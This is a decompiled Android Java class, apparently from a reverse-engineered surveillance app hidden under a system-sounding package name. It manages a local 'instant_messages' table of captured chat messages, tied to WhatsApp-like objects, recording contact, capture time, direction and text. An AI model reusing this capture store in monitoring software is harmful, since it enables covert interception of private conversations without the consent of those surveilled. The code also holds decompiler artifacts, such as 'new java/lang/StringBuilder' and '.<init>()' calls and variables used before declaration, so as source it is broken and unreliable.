package com.app.system.common.h;

import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteStatement;
import com.security.WA.WaObject;
import com.security.d.a;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class i
  extends b
{
  public static int d = 256;
  
  public i(Context paramContext)
  {
    super(paramContext);
  }
  
  public int a(List<WaObject> paramList)
  {
    int i = 0;
    if (paramList != null) {
      try
      {
        if (paramList.size() == 0) {
          return -2;
        }
        b();
        String str = "delete from instant_messages WHERE 1=0 ";
        Object localObject = paramList.iterator();
        while (((Iterator)localObject).hasNext())
        {
          WaObject localWaObject = (WaObject)((Iterator)localObject).next();
          StringBuilder localStringBuilder = new java/lang/StringBuilder;
          localStringBuilder.<init>();
          localStringBuilder.append(str);
          localStringBuilder.append(" or rowId = ");
          localStringBuilder.append(localWaObject.rowId);
          str = localStringBuilder.toString();
        }
        localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        ((StringBuilder)localObject).append("Delete: ");
        ((StringBuilder)localObject).append(paramList.size());
        ((StringBuilder)localObject).append("  MESSAGE.");
        a.d("INSTANT_MESS", ((StringBuilder)localObject).toString(), new Object[0]);
        this.a.execSQL(str);
        a();
      }
      catch (Exception paramList)
      {
        a.a("INSTANT_MESS", paramList.getMessage(), new Object[0]);
      }
    }
    i = -1;
    return i;
  }
  
  public long a(WaObject paramWaObject)
  {
    try
    {
      b();
      SQLiteStatement localSQLiteStatement = this.a.compileStatement("INSERT INTO instant_messages (app_type, address, person_name, date_captured, time, flags, text) VALUES (?,?,?,?,?,?,?)");
      localSQLiteStatement.bindLong(1, paramWaObject.AppType);
      localSQLiteStatement.bindString(2, paramWaObject.Contact);
      localSQLiteStatement.bindString(3, paramWaObject.Contact);
      localSQLiteStatement.bindLong(4, paramWaObject.CaptureTime);
      localSQLiteStatement.bindString(5, paramWaObject.Time);
      if (paramWaObject.Incoming) {
        l = 0L;
      } else {
        l = 1L;
      }
      localSQLiteStatement.bindLong(6, l);
      localSQLiteStatement.bindString(7, paramWaObject.Message);
      long l = localSQLiteStatement.executeInsert();
      return l;
    }
    catch (Exception paramWaObject)
    {
      a.d("INSTANT_MESS", paramWaObject.getMessage(), new Object[0]);
    }
    return -1L;
  }
  
  public long a(com.security.a.b paramb)
  {
    try
    {
      b();
      SQLiteStatement localSQLiteStatement = this.a.compileStatement("INSERT INTO instant_messages (app_type, address, person_name, date_captured, time, flags, text) VALUES (?,?,?,?,?,?,?)");
      localSQLiteStatement.bindLong(1, paramb.f);
      localSQLiteStatement.bindString(2, paramb.a);
      localSQLiteStatement.bindString(3, paramb.a);
      localSQLiteStatement.bindLong(4, paramb.e);
      localSQLiteStatement.bindString(5, paramb.b);
      if (paramb.d) {
        l = 0L;
      } else {
        l = 1L;
      }
      localSQLiteStatement.bindLong(6, l);
      localSQLiteStatement.bindString(7, paramb.c);
      long l = localSQLiteStatement.executeInsert();
      return l;
    }
    catch (Exception paramb)
    {
      a.d("INSTANT_MESS", paramb.getMessage(), new Object[0]);
    }
    return -1L;
  }
  
  public WaObject a(Cursor paramCursor)
  {
    WaObject localWaObject = new WaObject();
    boolean bool = false;
    localWaObject.rowId = paramCursor.getLong(0);
    localWaObject.AppType = paramCursor.getInt(1);
    localWaObject.Contact = paramCursor.getString(2);
    localWaObject.CaptureTime = paramCursor.getLong(4);
    localWaObject.Time = paramCursor.getString(5);
    if (paramCursor.getInt(6) != 0) {
      bool = true;
    }
    localWaObject.Incoming = bool;
    localWaObject.Message = paramCursor.getString(7);
    return localWaObject;
  }
  
  public List<WaObject> c()
  {
    localArrayList = new ArrayList();
    try
    {
      b();
      Cursor localCursor = this.a.rawQuery("SELECT rowId, app_type, address, person_name, date_captured, time, flags, text FROM instant_messages ORDER BY date_captured limit 1000", null);
      while (localCursor.moveToNext()) {
        localArrayList.add(a(localCursor));
      }
      return localArrayList;
    }
    catch (SQLException localSQLException)
    {
      a.a("INSTANT_MESS", "selectAll:", new Object[] { localSQLException });
    }
  }
}


/* Location:              ~/com/app/system/common/h/i.class
 *
 * Reversed by:           J
 */